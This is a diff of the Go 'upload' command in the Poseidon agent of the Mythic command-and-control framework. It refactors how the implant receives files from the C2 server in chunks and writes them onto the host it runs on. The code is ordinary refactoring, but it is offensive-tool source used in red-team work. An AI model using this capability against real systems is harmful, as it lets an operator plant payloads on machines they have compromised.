@@ -5,14 +5,12 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
-	"sync"
+	"strings"
 
 	// Poseidon
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
+
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
-
-var mu sync.Mutex
 
 type uploadArgs struct {
 	FileID     string `json:"file_id"`
@@ -20,10 +18,8 @@ type uploadArgs struct {
 	Overwrite  bool   `json:"overwrite"`
 }
 
-type getFile func(r structs.FileRequest, ch chan []byte) ([]byte, error)
-
 //Run - interface method that retrieves a process list
-func Run(task structs.Task, ch chan []byte, f getFile) {
+func Run(task structs.Task) {
 	msg := structs.Response{}
 	msg.TaskID = task.TaskID
 
@@ -33,74 +29,76 @@ func Run(task structs.Task, ch chan []byte, f getFile) {
 	err := json.Unmarshal([]byte(task.Params), &args)
 	if err != nil {
 		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
-		encErrResp, _ := json.Marshal(msg)
-		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
-		mu.Unlock()
+		task.Job.SendResponses <- msg
 		return
 	}
-
-	r := structs.FileRequest{}
-	r.TaskID = task.TaskID
+	r := structs.GetFileFromMythicStruct{}
 	r.FileID = args.FileID
-	r.FullPath, _ = filepath.Abs(args.RemotePath)
-	r.ChunkNumber = 0
-	r.TotalChunks = 0
-
-	fBytes, err := f(r, ch)
-
-	if err != nil {
-		msg.SetError(fmt.Sprintf("Failed to get file. Reason: %s", err.Error()))
-		encErrResp, _ := json.Marshal(msg)
-		mu.Lock()
-		profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
-		mu.Unlock()
-		return
+	fixedFilePath := args.RemotePath
+	if strings.HasPrefix(fixedFilePath, "~/") {
+		dirname, _ := os.UserHomeDir()
+		fixedFilePath = filepath.Join(dirname, fixedFilePath[2:])
 	}
-
-	switch _, err = os.Stat(args.RemotePath); err {
+	r.FullPath, _ = filepath.Abs(fixedFilePath)
+	r.Task = &task
+	r.SendUserStatusUpdates = true
+	totalBytesWritten := 0
+	switch _, err = os.Stat(r.FullPath); err {
 	case nil:
 		if args.Overwrite {
-			fp, err := os.OpenFile(args.RemotePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
+			fp, err := os.OpenFile(r.FullPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
 			if err != nil {
-				msg.SetError(fmt.Sprintf("Failed to get handle on %s: %s", args.RemotePath, err.Error()))
-				encErrResp, _ := json.Marshal(msg)
-				mu.Lock()
-				profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
-				mu.Unlock()
+				msg.SetError(fmt.Sprintf("Failed to get handle on %s: %s", r.FullPath, err.Error()))
+				task.Job.SendResponses <- msg
 				return
 			}
 			defer fp.Close()
-			fp.Write(fBytes)
+			r.ReceivedChunkChannel = make(chan []byte)
+			task.Job.GetFileFromMythic <- r
+
+			for {
+				newBytes := <-r.ReceivedChunkChannel
+				if len(newBytes) == 0 {
+					break
+				} else {
+					fp.Write(newBytes)
+					totalBytesWritten += len(newBytes)
+				}
+			}
 			break
 		} else {
-			msg.SetError(fmt.Sprintf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", args.RemotePath))
-			encErrResp, _ := json.Marshal(msg)
-			mu.Lock()
-			profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
-			mu.Unlock()
+			msg.SetError(fmt.Sprintf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", r.FullPath))
+			task.Job.SendResponses <- msg
 			return
 		}
 	default:
-		fp, err := os.Create(args.RemotePath)
+		fp, err := os.Create(r.FullPath)
 		if err != nil {
-			msg.SetError(fmt.Sprintf("Failed to create file %s. Reason: %s", args.RemotePath, err.Error()))
-			encErrResp, _ := json.Marshal(msg)
-			mu.Lock()
-			profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
-			mu.Unlock()
+			msg.SetError(fmt.Sprintf("Failed to create file %s. Reason: %s", r.FullPath, err.Error()))
+			task.Job.SendResponses <- msg
 			return
 		}
 		defer fp.Close()
-		fp.Write(fBytes)
+		r.ReceivedChunkChannel = make(chan []byte)
+		task.Job.GetFileFromMythic <- r
+
+		for {
+			newBytes := <-r.ReceivedChunkChannel
+			if len(newBytes) == 0 {
+				break
+			} else {
+				fp.Write(newBytes)
+				totalBytesWritten += len(newBytes)
+			}
+		}
 		break
 	}
+	if task.DidStop() {
 
-	msg.Completed = true
-	msg.UserOutput = fmt.Sprintf("Uploaded %d bytes to %s", len(fBytes), args.RemotePath)
-	resp, _ := json.Marshal(msg)
-	mu.Lock()
-	profiles.TaskResponses = append(profiles.TaskResponses, resp)
-	mu.Unlock()
+	} else {
+		msg.Completed = true
+		msg.UserOutput = fmt.Sprintf("Uploaded %d bytes to %s", totalBytesWritten, r.FullPath)
+		task.Job.SendResponses <- msg
+	}
 	return
 }
